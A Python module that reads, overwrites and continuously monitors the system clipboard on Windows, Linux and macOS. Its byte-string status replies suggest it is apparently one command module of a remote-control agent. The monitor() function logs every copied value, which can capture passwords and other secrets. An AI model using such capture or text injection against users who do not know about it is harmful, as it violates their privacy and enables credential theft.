#!/usr/bin/env python3
"""Clipboard module — read clipboard contents and inject text."""
import platform
import time

def read():
    """Read current clipboard content."""
    system = platform.system()
    if system == "Windows":
        return _read_windows()
    elif system == "Linux":
        return _read_linux()
    elif system == "Darwin":
        return _read_macos()
    return b"error: unsupported platform"

def write(text):
    """Write text to clipboard."""
    system = platform.system()
    if system == "Windows":
        return _write_windows(text)
    elif system == "Linux":
        return _write_linux(text)
    elif system == "Darwin":
        return _write_macos(text)
    return b"error: unsupported platform"

def _read_windows():
    try:
        import ctypes
        from ctypes import wintypes
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        CF_UNICODETEXT = 13
        if not user32.OpenClipboard(None):
            return b""
        try:
            if not user32.IsClipboardFormatAvailable(CF_UNICODETEXT):
                return b"(clipboard empty or non-text)"
            h = user32.GetClipboardData(CF_UNICODETEXT)
            if not h:
                return b""
            p = ctypes.windll.kernel32.GlobalLock(wintypes.HGLOBAL(h))
            try:
                s = ctypes.wstring_at(p)
                return s.encode("utf-8")
            finally:
                ctypes.windll.kernel32.GlobalUnlock(wintypes.HGLOBAL(h))
        finally:
            user32.CloseClipboard()
    except Exception as e:
        return f"error: {e}".encode()

def _write_windows(text):
    try:
        import ctypes
        from ctypes import wintypes
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        CF_UNICODETEXT = 13
        text_w = text + "\0"
        # Allocate global memory
        h = k32.GlobalAlloc(0x0042, (len(text_w) + 1) * 2)  # GMEM_MOVEABLE | GMEM_ZEROINIT
        if not h:
            return b"error: GlobalAlloc failed"
        p = k32.GlobalLock(h)
        ctypes.wcsncpy(ctypes.c_wchar_p(p), text_w, len(text_w) + 1)
        k32.GlobalUnlock(h)
        # Set clipboard
        if not user32.OpenClipboard(None):
            k32.GlobalFree(h)
            return b"error: OpenClipboard failed"
        try:
            user32.EmptyClipboard()
            user32.SetClipboardData(CF_UNICODETEXT, h)
        finally:
            user32.CloseClipboard()
        return b"ok: clipboard set"
    except Exception as e:
        return f"error: {e}".encode()

def _read_linux():
    try:
        import subprocess
        # Try xclip
        result = subprocess.run(["xclip", "-selection", "clipboard", "-o"],
            capture_output=True, timeout=5)
        if result.returncode == 0:
            return result.stdout
        # Try xsel
        result = subprocess.run(["xsel", "--clipboard", "--output"],
            capture_output=True, timeout=5)
        if result.returncode == 0:
            return result.stdout
        return b"error: install xclip or xsel"
    except Exception as e:
        return f"error: {e}".encode()

def _write_linux(text):
    try:
        import subprocess
        result = subprocess.run(["xclip", "-selection", "clipboard"],
            input=text.encode(), capture_output=True, timeout=5)
        if result.returncode == 0:
            return b"ok: clipboard set"
        result = subprocess.run(["xsel", "--clipboard", "--input"],
            input=text.encode(), capture_output=True, timeout=5)
        if result.returncode == 0:
            return b"ok: clipboard set"
        return b"error: install xclip or xsel"
    except Exception as e:
        return f"error: {e}".encode()

def _read_macos():
    try:
        import subprocess
        result = subprocess.run(["pbpaste"], capture_output=True, timeout=5)
        return result.stdout
    except Exception as e:
        return f"error: {e}".encode()

def _write_macos(text):
    try:
        import subprocess
        result = subprocess.run(["pbcopy"], input=text.encode(), capture_output=True, timeout=5)
        return b"ok: clipboard set"
    except Exception as e:
        return f"error: {e}".encode()

def monitor(duration=60):
    """Monitor clipboard for changes. Returns all unique clipboard contents seen."""
    seen = set()
    start = time.time()
    results = []
    last = ""
    while time.time() - start < duration:
        data = read()
        text = data.decode("utf-8", "replace")
        if text and text != last:
            results.append({"time": time.time(), "content": text})
            last = text
        time.sleep(0.5)
    return str(results).encode()
